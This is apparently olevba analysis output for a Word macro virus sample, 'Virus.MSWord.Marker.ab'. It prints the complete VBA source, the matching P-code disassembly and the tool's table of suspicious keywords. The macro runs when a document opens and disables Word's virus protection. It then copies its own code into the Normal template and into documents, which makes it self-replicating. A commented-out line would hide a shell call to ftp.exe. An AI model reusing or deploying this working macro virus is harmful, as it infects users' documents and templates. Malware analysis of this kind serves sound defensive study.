olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Marker.ab
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Marker.ab - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Document_Open()
On Error Resume Next

'DECLARATIONS

Dim sViralCode As String, nFreeFile As Integer
Dim oNormal As Object, oDocument As Object, sFileName As String
Dim rRange As Range

Const cIndicator = "CMC"  ' CONSTANT TO FIND IF THE FILE IS ALREADY INFECTED OR NOT

    Options.VirusProtection = False 'SET VIRUS PROTECTION TO OFF MODE
    nFreeFile = FreeFile

    Randomize
    sFileName = "\CMC" + Str(32767 * Rnd) + ".txt"
    
    Open CurDir + sFileName For Output As #nFreeFile
        Write #nFreeFile, "Railways is an integral part of CMC LTD. JAI CMC"
    Close #nFreeFile
    
    Set oDocument = ActiveDocument.VBProject.VBComponents.Item(1)
    Set oNormal = NormalTemplate.VBProject.VBComponents.Item(1)
    
    If (oNormal.CodeModule.Find(cIndicator, 1, 1, 999, 999)) = False Then
        sViralCode = oDocument.CodeModule.Lines(1, oDocument.CodeModule.CountOfLines)
        ViralCode = ViralCode & Chr(10)
        oNormal.CodeModule.DeleteLines 1, oNormal.CodeModule.CountOfLines
        oNormal.CodeModule.AddFromString sViralCode
        
    End If

'    Shell "Command.com /c ftp.exe -n -s:" + CurDir + sFileName, vbHide
    
    If (oDocument.CodeModule.Find(cIndicator, 1, 1, 999, 999)) = False Then
        sViralCode = oNormal.CodeModule.Lines(1, oNormal.CodeModule.CountOfLines)
        ViralCode = ViralCode & Chr(10)
        oDocument.CodeModule.DeleteLines 1, oNormal.CodeModule.CountOfLines
        oDocument.CodeModule.AddFromString sViralCode
    End If
    
    ActiveDocument.Save
    NormalTemplate.Save
   
End Sub


' Virus Created By An Indian Citizen



Private Sub Document_Close()





































End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Marker.ab
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7338 bytes
' Line #0:
' Line #1:
' Line #2:
' 	FuncDefn (Private Sub Document_Open())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' Line #5:
' 	QuoteRem 0x0000 0x000C "DECLARATIONS"
' Line #6:
' Line #7:
' 	Dim 
' 	VarDefn sViralCode (As String)
' 	VarDefn nFreeFile (As Integer)
' Line #8:
' 	Dim 
' 	VarDefn oNormal (As Object)
' 	VarDefn oDocument (As Object)
' 	VarDefn sFileName (As String)
' Line #9:
' 	Dim 
' 	VarDefn rRange (As Range)
' Line #10:
' Line #11:
' 	Dim (Const) 
' 	LitStr 0x0003 "CMC"
' 	VarDefn cIndicator
' 	QuoteRem 0x001A 0x0038 " CONSTANT TO FIND IF THE FILE IS ALREADY INFECTED OR NOT"
' Line #12:
' Line #13:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' 	QuoteRem 0x0024 0x0020 "SET VIRUS PROTECTION TO OFF MODE"
' Line #14:
' 	Ld Friend 
' 	St nFreeFile 
' Line #15:
' Line #16:
' 	ArgsCall Read 0x0000 
' Line #17:
' 	LitStr 0x0004 "\CMC"
' 	LitDI2 0x7FFF 
' 	Ld Rnd 
' 	Mul 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	LitStr 0x0004 ".txt"
' 	Add 
' 	St sFileName 
' Line #18:
' Line #19:
' 	Ld CurDir 
' 	Ld sFileName 
' 	Add 
' 	Ld nFreeFile 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #20:
' 	Ld nFreeFile 
' 	Sharp 
' 	WriteChan 
' 	LitStr 0x0030 "Railways is an integral part of CMC LTD. JAI CMC"
' 	PrintItemNL 
' Line #21:
' 	Ld nFreeFile 
' 	Sharp 
' 	Close 0x0001 
' Line #22:
' Line #23:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set oDocument 
' Line #24:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set oNormal 
' Line #25:
' Line #26:
' 	Ld cIndicator 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E7 
' 	LitDI2 0x03E7 
' 	Ld oNormal 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Paren 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #27:
' 	LitDI2 0x0001 
' 	Ld oDocument 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld oDocument 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St sViralCode 
' Line #28:
' 	Ld ViralCode 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St ViralCode 
' Line #29:
' 	LitDI2 0x0001 
' 	Ld oNormal 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld oNormal 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #30:
' 	Ld sViralCode 
' 	Ld oNormal 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #31:
' Line #32:
' 	EndIfBlock 
' Line #33:
' Line #34:
' 	QuoteRem 0x0000 0x0046 "    Shell "Command.com /c ftp.exe -n -s:" + CurDir + sFileName, vbHide"
' Line #35:
' Line #36:
' 	Ld cIndicator 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E7 
' 	LitDI2 0x03E7 
' 	Ld oDocument 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Paren 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #37:
' 	LitDI2 0x0001 
' 	Ld oNormal 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld oNormal 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St sViralCode 
' Line #38:
' 	Ld ViralCode 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St ViralCode 
' Line #39:
' 	LitDI2 0x0001 
' 	Ld oNormal 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld oDocument 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #40:
' 	Ld sViralCode 
' 	Ld oDocument 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #41:
' 	EndIfBlock 
' Line #42:
' Line #43:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #44:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #45:
' Line #46:
' 	EndSub 
' Line #47:
' Line #48:
' Line #49:
' 	QuoteRem 0x0000 0x0023 " Virus Created By An Indian Citizen"
' Line #50:
' Line #51:
' Line #52:
' Line #53:
' 	FuncDefn (Private Sub Document_Close())
' Line #54:
' Line #55:
' Line #56:
' Line #57:
' Line #58:
' Line #59:
' Line #60:
' Line #61:
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' Line #66:
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ftp.exe             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

